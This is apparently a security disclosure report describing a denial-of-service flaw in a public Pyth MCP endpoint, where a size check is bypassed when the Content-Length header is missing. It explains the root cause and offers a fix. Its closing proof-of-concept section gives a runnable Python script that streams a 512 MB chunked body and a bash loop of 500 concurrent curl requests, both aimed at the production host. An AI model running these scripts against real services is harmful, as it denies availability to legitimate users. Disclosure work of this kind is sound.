### Title
Unauthenticated `/mcp` Endpoint Body-Size Guard Bypassed via Missing `Content-Length` Header Enables OOM DoS — (`apps/mcp/src/http.ts`)

### Summary
The publicly documented Pyth MCP HTTP server at `https://mcp.pyth.network/mcp` exposes an unauthenticated `POST /mcp` endpoint. A body-size guard of 1 MB is implemented, but it is evaluated using `Number(req.headers["content-length"])`, which yields `NaN` when the `Content-Length` header is absent. Because `NaN > MAX_BODY_BYTES` evaluates to `false` in JavaScript, the guard is silently bypassed. An attacker can POST an arbitrarily large body without a `Content-Length` header, causing the `StreamableHTTPServerTransport` to buffer the entire payload in memory and crash the process with an out-of-memory error. Compounding this, every request that reaches the handler unconditionally allocates a fresh `McpServer` and `StreamableHTTPServerTransport` instance before any body is read, so concurrent flooding amplifies memory pressure even with small payloads.

### Finding Description

**Root cause — `apps/mcp/src/http.ts`, lines 53–54:**

```javascript
const contentLength = Number(req.headers["content-length"]);
if (contentLength > MAX_BODY_BYTES) {   // NaN > 1_048_576 → false
```

`req.headers["content-length"]` is `undefined` when the header is omitted. `Number(undefined)` produces `NaN`. Any comparison involving `NaN` returns `false` in JavaScript, so the `413` early-return is never reached and the oversized body flows into `transport.handleRequest(req, res)` unchecked.

**Per-request resource allocation — lines 60–64:**

```javascript
const { server } = createServer(config, logger);
const transport = new StreamableHTTPServerTransport({
  enableJsonResponse: true,
  sessionIdGenerator: undefined,
});
```

A new `McpServer` (which registers all tools and resources) and a new `StreamableHTTPServerTransport` are instantiated for every incoming request, before the body is read. There is no connection limit, no concurrency cap, and no rate limiter on this path.

**Public exposure — `apps/developer-hub/content/docs/price-feeds/pro/mcp.mdx`, line 34–36:**

```
Endpoint: https://mcp.pyth.network/mcp
Auth: No key required at the endpoint level
```

The endpoint is intentionally public and unauthenticated at the transport layer.

**Attack path:**

1. Attacker opens many concurrent TCP connections to `https://mcp.pyth.network/mcp`.
2. Each connection sends `POST /mcp HTTP/1.1` with no `Content-Length` header and a chunked or streaming body of arbitrary size (e.g., several gigabytes).
3. The size guard at line 54 evaluates `NaN > 1_048_576` → `false` and does not reject the request.
4. Lines 60–64 allocate a new `McpServer` + `StreamableHTTPServerTransport` per connection.
5. `transport.handleRequest(req, res)` buffers the entire body in memory before attempting JSON parsing.
6. Node.js heap is exhausted; the process crashes with `FATAL ERROR: Reached heap limit`.

Even without oversized bodies, step 4 alone (many concurrent requests each allocating two heavyweight objects) is sufficient to exhaust memory.

### Impact Explanation

The MCP server process crashes, making `https://mcp.pyth.network/mcp` unavailable to all users and AI clients (Claude Desktop, Cursor, Windsurf, etc.) that rely on it for real-time Pyth price data. Because the server is stateless and restarts automatically in a container environment, the attacker only needs to sustain the flood to maintain the outage. There is no financial loss of funds, but the availability of a documented, production Pyth API endpoint is fully denied to legitimate users.

### Likelihood Explanation

The endpoint is publicly documented with no authentication requirement. The NaN bypass requires only omitting a single HTTP header — trivially achievable with any HTTP client (`curl --no-content-length`, raw socket, or chunked transfer encoding). No privileged access, leaked keys, or social engineering is required. The attack is repeatable and automatable.

### Recommendation

Replace the header-based check with actual streaming body accounting that does not rely on the client-supplied `Content-Length` value:

```javascript
// Enforce body size by reading the stream with a hard cap
await new Promise<void>((resolve, reject) => {
  let received = 0;
  req.on("data", (chunk: Buffer) => {
    received += chunk.length;
    if (received > MAX_BODY_BYTES) {
      req.destroy();
      if (!res.headersSent) {
        res.writeHead(413, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ error: "Payload Too Large" }));
      }
      reject(new Error("body too large"));
    }
  });
  req.on("end", resolve);
  req.on("error", reject);
});
```

Additionally:
- Add a per-IP rate limiter (e.g., `express-rate-limit` or a token-bucket in the existing handler) before the `McpServer` allocation at line 60.
- Defer `createServer()` allocation until after the body size is confirmed within limits.
- Consider adding a concurrency cap (e.g., `http.maxConnections`) on the Node.js server.

### Proof of Concept

```bash
# Single oversized request bypassing the Content-Length guard
# Transfer-Encoding: chunked causes Node.js to omit Content-Length
python3 -c "
import socket, ssl, time

HOST = 'mcp.pyth.network'
ctx = ssl.create_default_context()
s = ctx.wrap_socket(socket.create_connection((HOST, 443)), server_hostname=HOST)

# Send headers without Content-Length
s.sendall(b'POST /mcp HTTP/1.1\r\nHost: mcp.pyth.network\r\nContent-Type: application/json\r\nTransfer-Encoding: chunked\r\n\r\n')

# Stream 512 MB of data in chunks — NaN guard never fires
chunk = b'A' * 65536
hex_len = hex(len(chunk))[2:].encode() + b'\r\n'
for _ in range(8192):   # 8192 * 64 KB = 512 MB
    s.sendall(hex_len + chunk + b'\r\n')
s.sendall(b'0\r\n\r\n')
print(s.recv(4096))
"

# Concurrent flood to exhaust per-request McpServer allocations
for i in $(seq 1 500); do
  curl -s -X POST https://mcp.pyth.network/mcp \
    -H 'Content-Type: application/json' \
    --data-binary '{"jsonrpc":"2.0","method":"tools/list","id":1}' &
done
wait
```

The first script sends a 512 MB body without a `Content-Length` header; the size guard evaluates `NaN > 1048576 = false` and the body is buffered in full. The second script opens 500 concurrent requests, each triggering a `createServer()` allocation before any body is read, exhausting the Node.js heap. [1](#0-0) [2](#0-1) [3](#0-2)
